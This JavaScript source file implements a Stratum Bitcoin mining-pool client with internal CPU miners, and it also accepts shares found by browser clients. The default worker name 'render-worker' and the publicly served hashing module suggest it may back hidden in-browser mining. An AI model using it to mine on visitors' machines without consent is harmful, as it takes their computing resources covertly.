const net = require('net');
const crypto = require('crypto');
const SHA256D = require('../public/sha256d.js');
const MAX_TARGET = Buffer.from('00000000ffff0000000000000000000000000000000000000000000000000000', 'hex');

class StratumClient {
  constructor(config, jobManager) {
    this.config = config;
    this.jobManager = jobManager;
    this.poolHost = config.STRATUM_POOL_HOST || 'stratum.braiins.com';
    this.poolPort = parseInt(config.STRATUM_POOL_PORT || '3333', 10);
    this.workerName = config.STRATUM_WORKER_NAME || 'render-worker';
    this.workerPass = config.STRATUM_WORKER_PASSWORD || 'x';
    this.payoutAddress = config.PAYOUT_ADDRESS || '';

    this.socket = null;
    this.connected = false;
    this.authorized = false;
    this.rpcId = 0;
    this.pendingRpcs = new Map();
    this.buffer = '';
    this.extranonce1 = '';
    this.extranonce1Size = 0;
    this.extranonce2Size = 4;
    this.currentDifficulty = 1;
    this.shareTarget = null;
    this.miners = [];
    this.mining = false;
    this.reconnectAttempts = 0;
    this.reconnectTimer = null;

    this.onNewJob = null;
    this.onShare = null;
    this.onBlock = null;
    this.onStatus = null;
  }

  connect() {
    if (this.socket && this.socket.readyState === 'open') return;
    this.buffer = '';
    this.socket = new net.Socket();

    this.socket.on('connect', () => {
      console.log('[Stratum] Connected to ' + this.poolHost + ':' + this.poolPort);
      this.connected = true;
      this.reconnectAttempts = 0;
      if (this.onStatus) this.onStatus('connected');
      this.subscribe();
    });

    this.socket.on('data', (data) => {
      this.buffer += data.toString();
      let newline;
      while ((newline = this.buffer.indexOf('\n')) !== -1) {
        const line = this.buffer.substring(0, newline).trim();
        this.buffer = this.buffer.substring(newline + 1);
        if (line) this.handleMessage(line);
      }
    });

    this.socket.on('close', () => {
      console.log('[Stratum] Disconnected from pool');
      this.connected = false;
      this.authorized = false;
      this.stopMiners();
      if (this.onStatus) this.onStatus('disconnected');
      this.scheduleReconnect();
    });

    this.socket.on('error', (err) => {
      console.error('[Stratum] Socket error:', err.message);
      this.connected = false;
    });

    this.socket.connect(this.poolPort, this.poolHost);
  }

  disconnect() {
    if (this.reconnectTimer) { clearTimeout(this.reconnectTimer); this.reconnectTimer = null; }
    this.stopMiners();
    if (this.socket) { this.socket.destroy(); this.socket = null; }
    this.connected = false;
    this.authorized = false;
  }

  send(line) {
    if (this.socket && this.connected) {
      this.socket.write(line + '\n');
    }
  }

  rpc(method, params, callback) {
    const id = ++this.rpcId;
    if (callback) this.pendingRpcs.set(id, callback);
    this.send(JSON.stringify({ id, method, params }));
  }

  subscribe() {
    this.rpc('mining.subscribe', ['old-btc-miner-v5/1.0'], (result) => {
      if (result && result[1]) {
        this.extranonce1 = result[1];
        this.extranonce1Size = result[1].length / 2;
      }
      if (result && result[2]) {
        this.extranonce2Size = result[2];
      }
      console.log('[Stratum] Subscribed. extranonce1=' + this.extranonce1 + ' size=' + this.extranonce1Size);
      this.authorize();
    });
  }

  authorize() {
    const worker = this.payoutAddress ? this.payoutAddress + '.' + this.workerName : this.workerName;
    this.rpc('mining.authorize', [worker, this.workerPass], (result) => {
      this.authorized = result === true || result === 'ok' || (result && result.authorized);
      if (this.authorized) {
        console.log('[Stratum] Authorized as ' + worker);
      } else {
        console.error('[Stratum] Authorization failed:', JSON.stringify(result));
      }
    });
  }

  handleMessage(line) {
    let msg;
    try { msg = JSON.parse(line); } catch (e) { return; }

    if (msg.id !== undefined && this.pendingRpcs.has(msg.id)) {
      const cb = this.pendingRpcs.get(msg.id);
      this.pendingRpcs.delete(msg.id);
      if (msg.error) console.error('[Stratum] RPC error (id=' + msg.id + '):', JSON.stringify(msg.error));
      if (cb) cb(msg.result, msg.error);
      return;
    }

    if (msg.method === 'mining.notify') {
      this.handleNotify(msg.params);
    } else if (msg.method === 'mining.set_difficulty') {
      if (msg.params && msg.params[0] !== undefined) {
        this.currentDifficulty = msg.params[0];
        this.shareTarget = this.computeShareTarget(this.currentDifficulty);
        console.log('[Stratum] Pool difficulty: ' + this.currentDifficulty);
      }
    } else if (msg.method === 'client.reconnect') {
      const delay = msg.params && msg.params[2] ? msg.params[2] : 5;
      console.log('[Stratum] Pool requests reconnect in ' + delay + 's');
      setTimeout(() => this.disconnect(), 1000);
      setTimeout(() => this.connect(), (delay + 1) * 1000);
    }
  }

  handleNotify(params) {
    if (!params || params.length < 8) return;
    const [jobId, prevhash, coinb1, coinb2, merkleBranches, version, nbits, ntime, cleanJobs] = params;

    if (cleanJobs) {
      this.jobManager.staleAll();
      this.stopMiners();
    }

    const job = this.assembleJob(jobId, prevhash, coinb1, coinb2, merkleBranches, version, nbits, ntime);
    if (job) {
      this.jobManager.setStratumJob(job);
      if (this.onNewJob) this.onNewJob(job);
      if (this.config.STRATUM_INTERNAL_MINERS !== 'false') {
        this.startMiners(job);
      }
    }
  }

  assembleJob(jobId, prevhash, coinb1, coinb2, merkleBranches, version, nbits, ntime) {
    try {
      const extranonce2 = '00000000';
      const coinbaseHex = coinb1 + this.extranonce1 + extranonce2 + coinb2;
      const coinbaseBuf = Buffer.from(coinbaseHex, 'hex');
      const coinbaseHash = Buffer.from(SHA256D.d(coinbaseBuf));

      let current = Buffer.from(coinbaseHash);
      for (const branchHex of merkleBranches) {
        const branch = Buffer.from(branchHex, 'hex');
        const combined = Buffer.concat([current, branch]);
        current = Buffer.from(SHA256D.d(combined));
      }
      const merkleRoot = current;

      const header = Buffer.alloc(80);
      header.writeUInt32LE(parseInt(version, 16) >>> 0, 0);
      Buffer.from(prevhash, 'hex').reverse().copy(header, 4);
      merkleRoot.copy(header, 36);
      header.writeUInt32LE(parseInt(ntime, 16) >>> 0, 68);
      Buffer.from(nbits, 'hex').reverse().copy(header, 72);

      const midstate = SHA256D.computeMidstate(header);

      const blockTarget = this.computeBlockTarget(nbits);
      if (!this.shareTarget) {
        this.shareTarget = this.computeShareTarget(this.currentDifficulty);
      }

      const job = {
        jobId: 'stratum_' + jobId,
        stratumJobId: jobId,
        height: 0,
        header: Array.from(header),
        midstate: Array.from(midstate),
        shareTarget: Array.from(this.shareTarget),
        blockTarget: Array.from(blockTarget),
        nonceStart: 0,
        nonceEnd: 0xFFFFFFFF,
        extranonce2: extranonce2,
        ntime: ntime,
        version: version,
        prevhash: prevhash,
        nbits: nbits,
        createdAt: Date.now(),
        stale: false
      };

      return job;
    } catch (e) {
      console.error('[Stratum] Job assembly error:', e.message);
      return null;
    }
  }

  computeBlockTarget(nbits) {
    const bits = Buffer.from(nbits, 'hex');
    const exp = bits[0];
    const mantissa = (bits[1] << 16) | (bits[2] << 8) | bits[3];
    const target = new Uint8Array(32);
    if (exp <= 3) {
      const v = mantissa >>> ((3 - exp) * 8);
      target[29] = (v >>> 16) & 0xFF;
      target[30] = (v >>> 8) & 0xFF;
      target[31] = v & 0xFF;
    } else {
      const pos = 32 - exp;
      if (pos >= 0 && pos + 3 <= 32) {
        target[pos] = (mantissa >>> 16) & 0xFF;
        target[pos + 1] = (mantissa >>> 8) & 0xFF;
        target[pos + 2] = mantissa & 0xFF;
      }
    }
    return target;
  }

  computeShareTarget(difficulty) {
    if (!difficulty || difficulty <= 0) difficulty = 1;
    const maxTargetBig = BigInt('0x' + MAX_TARGET.toString('hex'));
    let targetBig = maxTargetBig / BigInt(Math.round(difficulty));
    const result = new Uint8Array(32);
    for (let i = 31; i >= 0; i--) {
      result[i] = Number(targetBig & 0xFFn);
      targetBig >>= 8n;
    }
    return result;
  }

  startMiners(job) {
    this.stopMiners();
    const numMiners = Math.max(1, Math.min(parseInt(this.config.STRATUM_MINER_THREADS || '4', 10), 8));
    const U = 0x100000000;
    const span = Math.floor(U / numMiners);
    this.mining = true;

    console.log('[Stratum] Starting ' + numMiners + ' internal miners');

    for (let i = 0; i < numMiners; i++) {
      const from = i * span;
      const to = i === numMiners - 1 ? U : (i + 1) * span;
      const miner = { running: true, from: from, to: to, hashes: 0, lastRate: Date.now() };
      this.miners.push(miner);
      this.mineLoop(miner, job, from, to);
    }
  }

  mineLoop(miner, job, nonce, end) {
    if (!miner.running || !this.mining) return;
    const fullHeader = new Uint8Array(job.header);
    const header76 = fullHeader.subarray(0, 76);
    const shareTarget = new Uint8Array(job.shareTarget);
    const start = Date.now();
    let count = 0;

    while (miner.running && this.mining && count < 2048 && nonce !== end) {
      const hash = SHA256D.hash80(header76, nonce);
      count++;
      nonce = (nonce + 1) >>> 0;

      if (SHA256D.meets(hash, shareTarget)) {
        const foundNonce = ((nonce - 1) >>> 0);
        this.submitShare(job, foundNonce, hash);
      }

      if (Date.now() - start >= 20) break;
    }

    miner.hashes += count;
    const now = Date.now();
    if (now - miner.lastRate >= 5000) {
      const rate = Math.round(miner.hashes * 1000 / (now - miner.lastRate));
      if (this.onStatus) this.onStatus('mining', rate);
      miner.hashes = 0;
      miner.lastRate = now;
    }

    if (nonce === end || nonce === 0) {
      console.log('[Stratum] Nonce range exhausted for job ' + job.stratumJobId);
      return;
    }

    setImmediate(() => this.mineLoop(miner, job, nonce, end));
  }

  submitShare(job, nonce, hash) {
    const hashHex = SHA256D.hex(hash);
    const params = [
      this.payoutAddress ? this.payoutAddress + '.' + this.workerName : this.workerName,
      job.stratumJobId,
      job.extranonce2,
      job.ntime,
      nonce.toString(16).padStart(8, '0')
    ];

    this.rpc('mining.submit', params, (result, error) => {
      if (error) {
        console.error('[Stratum] Share rejected:', JSON.stringify(error));
        if (this.onShare) this.onShare('rejected', error);
      } else {
        if (this.onShare) this.onShare('accepted');
        const meetsBlock = SHA256D.meets(hash, new Uint8Array(job.blockTarget));
        if (meetsBlock) {
          console.log('[Stratum] BLOCK FOUND! Hash: ' + hashHex);
          if (this.onBlock) this.onBlock(job, nonce, hashHex);
        }
      }
    });
  }

  stopMiners() {
    this.mining = false;
    for (const m of this.miners) { m.running = false; }
    this.miners = [];
  }

  scheduleReconnect() {
    if (this.reconnectTimer) return;
    this.reconnectAttempts++;
    const delay = Math.min(3000 * Math.pow(2, this.reconnectAttempts - 1), 60000);
    console.log('[Stratum] Reconnecting in ' + (delay / 1000) + 's (attempt ' + this.reconnectAttempts + ')');
    this.reconnectTimer = setTimeout(() => {
      this.reconnectTimer = null;
      this.connect();
    }, delay);
  }

  getStatus() {
    return {
      connected: this.connected,
      authorized: this.authorized,
      pool: this.poolHost + ':' + this.poolPort,
      difficulty: this.currentDifficulty,
      miners: this.miners.length,
      extranonce1: this.extranonce1
    };
  }

  submitBrowserShare(jobId, nonce, hashHex, meetsBlock) {
    const job = this.jobManager.getJob(jobId);
    if (!job || !job.stratumJobId) return;
    const params = [
      this.payoutAddress ? this.payoutAddress + '.' + this.workerName : this.workerName,
      job.stratumJobId,
      job.extranonce2 || '00000000',
      job.ntime || '00000000',
      nonce.toString(16).padStart(8, '0')
    ];
    this.rpc('mining.submit', params, (result, error) => {
      if (error) {
        console.log('[Stratum] Browser share rejected:', JSON.stringify(error));
      } else {
        console.log('[Stratum] Browser share accepted');
        if (meetsBlock) {
          console.log('[Stratum] BLOCK FOUND by browser! Hash:', hashHex);
          if (this.onBlock) this.onBlock(job, nonce, hashHex);
        }
      }
    });
  }
}

module.exports = StratumClient;
